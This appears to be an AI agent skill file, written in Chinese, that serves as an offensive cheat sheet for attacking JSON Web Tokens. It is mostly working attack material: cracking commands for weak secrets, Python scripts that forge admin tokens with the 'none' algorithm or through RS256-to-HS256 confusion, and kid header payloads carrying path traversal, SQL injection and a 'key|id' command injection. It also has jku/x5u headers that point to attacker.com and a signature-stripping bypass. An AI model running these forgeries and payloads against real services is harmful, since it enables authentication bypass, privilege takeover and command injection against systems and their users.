---
name: jwt安全攻击
description: Use when encountering jwt漏洞利用 - 弱密钥爆破、算法混淆、none算法绕过、kid注入、签名绕过
---

# JWT安全攻击

## Info

- **Domain**: web
- **Tags**: web, jwt, authentication, bypass

## 攻击思路
```
Token获取 → 结构分析 → 攻击方式选择 → Token伪造/绕过 → 权限获取
```

## JWT结构

```
Header.Payload.Signature

Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"admin","iat":1234567890}
Signature: HMACSHA256(base64(Header)+"."+base64(Payload), secret)
```

## 攻击类型矩阵

| 攻击类型 | 条件 | 方法 |
|----------|------|------|
| 弱密钥爆破 | HS256等对称加密 | 字典暴力破解 |
| None算法绕过 | 算法未严格校验 | alg: none |
| 算法混淆 | RS256→HS256 | 公钥作为HMAC密钥 |
| kid注入 | kid参数可控 | SQL注入/路径穿越 |
| jku/x5u注入 | URL参数可控 | 指向恶意JWKS |
| 空签名绕过 | 签名验证缺陷 | 删除签名部分 |

## 弱密钥爆破

```bash
# hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# john
john --wordlist=rockyou.txt jwt.txt

# jwt_tool
python jwt_tool.py <token> -C -d wordlist.txt

# jwt-cracker
jwt-cracker <token> "abcdefghijklmnopqrstuvwxyz" 6
```

## None算法绕过

```python
import jwt, base64, json

# 方法1: 使用jwt库
token = jwt.encode({"user":"admin"}, "", algorithm="none")

# 方法2: 手动构造
def forge_none(payload):
    h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{h}.{p}."

# 测试变体: none, None, NONE, nOnE
```

## 算法混淆攻击(RS256→HS256)

```python
import jwt

# 使用公钥作为HMAC密钥
public_key = open('public.pem').read()
token = jwt.encode({"user":"admin"}, public_key, algorithm="HS256")

# jwt_tool
python jwt_tool.py <token> -X k -pk public.pem
```

```
原理:
服务器使用RS256(非对称)
攻击者改为HS256(对称)
服务器用公钥验证HMAC签名
攻击者用公钥签名,服务器验证通过
```

## kid注入攻击

```json
// Header注入kid
{"alg":"HS256","kid":"../../dev/null"}

// SQL注入
{"alg":"HS256","kid":"key1' UNION SELECT 'secret'--"}

// 命令注入
{"alg":"HS256","kid":"key|id"}
```

```python
# kid路径穿越 → 使用已知文件作为密钥
# /dev/null → 空密钥
token = jwt.encode({"user":"admin"}, "", algorithm="HS256", headers={"kid":"../../dev/null"})
```

## jku/x5u注入

```json
// Header注入恶意URL
{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
```

```
攻击流程:
1. 修改jku/x5u指向攻击者服务器
2. 在攻击者服务器部署恶意JWKS
3. 使用恶意私钥签名Token
4. 服务器获取恶意公钥验证签名
5. 验证通过,Token被接受
```

## 空签名绕过

```
原始Token: xxx.yyy.zzz
绕过Token: xxx.yyy.

删除签名部分,仅保留Header和Payload
```

## 解码与伪造脚本

```python
import jwt, base64, json

def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

def forge_hs256(payload, secret):
    return jwt.encode(payload, secret, algorithm="HS256")

def forge_none(payload):
    h = base64.urlsafe_b64encode(json.dumps({"alg":"none"}).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{h}.{p}."
```

## 工具速查

| 工具 | 命令 | 用途 |
|------|------|------|
| jwt_tool | jwt_tool.py <token> | 解码分析 |
| jwt_tool | jwt_tool.py <token> -C -d wordlist | 爆破密钥 |
| jwt_tool | jwt_tool.py <token> -X a -pk pub.pem | 算法混淆 |
| jwt_tool | jwt_tool.py <token> -X n | None算法 |
| jwt_tool | jwt_tool.py <token> -T | 交互式修改 |
| hashcat | hashcat -m 16500 | 密钥爆破 |